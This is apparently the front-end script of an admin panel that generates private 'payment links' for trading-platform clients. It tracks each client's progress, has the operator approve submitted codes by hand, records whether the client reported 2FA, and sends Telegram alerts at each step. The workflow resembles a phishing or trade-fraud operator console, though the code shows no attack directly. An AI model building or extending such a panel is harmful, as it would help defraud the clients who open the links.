'use strict';
const $=s=>document.querySelector(s);
const esc=s=>String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const date=s=>{try{return new Date(s).toLocaleString();}catch{return s;}};
const state={trades:[],events:[]};
async function api(url,body){
  const res=await fetch(url,{credentials:'same-origin',...(body===undefined?{}:{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)})});
  const data=await res.json();if(!res.ok)throw new Error(data.error||'Request failed.');return data;
}
function alertAt(id,msg,error=false){const el=$(id);el.hidden=false;el.textContent=msg;el.classList.toggle('error',error);}
function clearAlert(id){$(id).hidden=true;$(id).textContent='';}
async function copy(s){
  try {if(navigator.clipboard&&window.isSecureContext){await navigator.clipboard.writeText(s);return true;}}
  catch{}
  const t=document.createElement('textarea');t.value=s;t.style.cssText='position:absolute;left:-9999px';document.body.append(t);t.select();
  let good=false;try{good=document.execCommand('copy');}catch{}t.remove();return good;
}
async function initial(){
  try{
    const me=await api('/api/admin/me');toggleAuth(me);
    if(me.authenticated)await refresh();
    const data=await api('/api/currencies');
    const select=$('#currency'),original='USD';
    select.innerHTML=data.currencies.map(c=>`<option value="${esc(c)}" ${c===original?'selected':''}>${esc(c)}</option>`).join('');
  }catch(e){alertAt('#login-alert',e.message,true);}
}
function toggleAuth(me){
  $('#login-view').hidden=Boolean(me.authenticated);
  $('#dashboard-view').hidden=!me.authenticated;
  $('#logged-in-actions').hidden=!me.authenticated;
  if(me.authenticated){
    $('#welcome').textContent='@'+me.username;
    const el=$('#telegram-status');el.textContent=me.telegramConfigured?'Bot configured':'Bot not configured';
    el.className='pill '+(me.telegramConfigured?'good':'bad');
  }
}
async function refresh(){
  const data=await api('/api/admin/trades');state.trades=data.trades;state.events=data.events;
  $('#metric-total').textContent=state.trades.length;
  $('#metric-accept').textContent=state.trades.filter(t=>t.finalDecision==='Accept').length;
  $('#metric-reject').textContent=state.trades.filter(t=>t.finalDecision==='Reject').length;
  $('#metric-open').textContent=state.trades.filter(t=>t.stage!=='final').length;
  renderEvents();renderTrades();
}
function renderEvents(){
  const list=$('#activity-list');
  if(!state.events.length){list.innerHTML='<p class="muted small">No activity yet. Events appear here as clients progress through their links.</p>';return;}
  list.innerHTML=state.events.slice(0,55).map(e=>{
    const tr=state.trades.find(t=>t.id===e.tradeId);
    return `<article class="activity-item"><span class="activity-dot"></span><div style="flex:1;min-width:0"><strong>${esc(e.title)}</strong><p>${esc(tr?.platform||'Trade')} · ${esc(tr?.tradeId||'')} · ${date(e.createdAt)}</p>${e.detail?`<p>${esc(e.detail)}</p>`:''}</div><span class="delivery ${esc(e.telegram)}">${esc(e.telegram)}</span></article>`;
  }).join('');
}
function tradeStatus(t){
  if(t.finalDecision==='Accept')return 'Accepted instruction';
  if(t.finalDecision==='Reject')return 'Rejected instruction';
  if(t.stage==='new')return 'Link not started';
  if(t.stage==='promo_pending')return 'Awaiting code approval';
  if(t.stage==='promo_rejected')return 'Code rejected · retry';
  if(t.stage==='promo_verified')return 'Code approved · awaiting 2FA';
  return 'Client in progress';
}
function renderTrades(){
  const list=$('#trades-list');
  if(!state.trades.length){list.innerHTML='<p class="muted small">No transactions yet. Create your first request above.</p>';return;}
  list.innerHTML=state.trades.map(t=>`
    <article class="trade-entry"><div class="trade-header"><div class="trade-title"><span class="platform-chip ${t.platform.toLowerCase()}">${esc(t.platform)}</span><b>${esc(t.amount)} ${esc(t.currency)}</b></div><span class="pill ${t.finalDecision==='Accept'?'good':t.finalDecision==='Reject'?'bad':''}">${esc(tradeStatus(t))}</span></div>
      <div class="trade-meta"><span><b>Trade:</b> ${esc(t.tradeId)}</span><span><b>Bank:</b> ${esc(t.bankName)}</span><span><b>Client:</b> ${esc(t.contactMasked||t.clientLabel||'Not provided')}</span><span><b>Created:</b> ${date(t.issuedAt)}</span></div>
      <div class="trade-actions"><button class="button button-small button-quiet" data-expand="${t.id}">View link & details</button><button class="button button-small button-quiet" data-print="${t.id}">Print / Save PDF</button><span class="pill">${Number(t.notificationCount||0)} Telegram alerts sent</span></div>
      ${t.stage==='promo_pending'?`<div class="review-panel"><strong>Manual approval needed</strong><p class="muted small">The client submitted a trade-chat reference ending ${esc(t.reviewHint||'—')}. Use the buttons in your private Telegram chat. If Telegram is unavailable, use the backup buttons below.</p><div class="trade-actions"><button class="button button-small button-primary" data-review="approve" data-id="${t.id}" data-review-id="${esc(t.reviewId)}">Approve reference</button><button class="button button-small button-danger" data-review="reject" data-id="${t.id}" data-review-id="${esc(t.reviewId)}">Reject reference</button></div></div>`:''}
      <div class="trade-expanded" id="details-${t.id}" hidden><label>Private client link<div class="copy-row"><input id="link-${t.id}" value="${esc(t.link)}" readonly><button class="button button-small button-quiet" data-copy="link-${t.id}">Copy</button></div></label><span class="muted small">Expires ${date(t.expiresAt)} · Client 2FA: ${esc(t.securityReported||'not reported')}</span></div>
    </article>`).join('');
}
$('#login-form').addEventListener('submit',async e=>{
  e.preventDefault();clearAlert('#login-alert');
  const form=e.currentTarget,button=form.querySelector('button[type=submit]');button.disabled=true;
  try{const o=Object.fromEntries(new FormData(form));await api('/api/admin/login',o);form.reset();const me=await api('/api/admin/me');toggleAuth(me);await refresh();}
  catch(error){alertAt('#login-alert',error.message,true);}finally{button.disabled=false;}
});
$('#logout-btn').addEventListener('click',async()=>{await api('/api/admin/logout',{});toggleAuth({authenticated:false});});
$('#refresh-btn').addEventListener('click',async()=>{try{await refresh();}catch(e){alertAt('#create-alert',e.message,true);}});
$('#trade-form').addEventListener('submit',async e=>{
  e.preventDefault();clearAlert('#create-alert');
  const form=e.currentTarget,button=$('#create-btn');button.disabled=true;button.textContent='Generating…';
  try{
    const f=Object.fromEntries(new FormData(form));
    const data=await api('/api/admin/trades',f);
    $('#new-link').value=data.trade.link;
    $('#generated').hidden=false;
    alertAt('#create-alert','Payment link created. Share it with the client and send your own trade reference in the original trading chat. A code submitted by the client will require manual approval.');
    const platform=f.platform;form.reset();form.querySelector('[name=platform]').value=platform;
    await refresh();
  }catch(error){alertAt('#create-alert',error.message,true);}finally{button.disabled=false;button.textContent='Generate payment link';}
});
$('#telegram-test').addEventListener('click',async e=>{
  const button=e.currentTarget;button.disabled=true;
  try{const r=await api('/api/admin/test-telegram',{});button.textContent=r.ok?'Test alert delivered':'Delivery: '+r.delivery;await refresh();}
  catch(err){button.textContent=err.message;}finally{setTimeout(()=>{button.textContent='Send test Telegram alert';button.disabled=false;},4000);}
});
document.addEventListener('click',async e=>{
  const b=e.target.closest('button');if(!b)return;
  if(b.dataset.copy){
    const input=document.getElementById(b.dataset.copy);if(!input)return;
    const success=await copy(input.value);const old=b.textContent;b.textContent=success?'Copied!':'Select & copy';
    if(!success){input.focus();input.select();}setTimeout(()=>b.textContent=old,1800);
  }
  if(b.dataset.expand){const el=document.getElementById('details-'+b.dataset.expand);el.hidden=!el.hidden;b.textContent=el.hidden?'View link & details':'Hide link & details';}
  if(b.dataset.print){window.open('/api/admin/trades/'+encodeURIComponent(b.dataset.print)+'/print','_blank','noopener');}
  if(b.dataset.review){
    const choice=b.dataset.review;
    if(!confirm((choice==='approve'?'Approve':'Reject')+' this trade reference?'))return;
    b.disabled=true;
    try{await api('/api/admin/trades/'+encodeURIComponent(b.dataset.id)+'/review',{decision:choice,reviewId:b.dataset.reviewId});await refresh();}
    catch(error){alertAt('#create-alert',error.message,true);b.disabled=false;}
  }
});
initial();
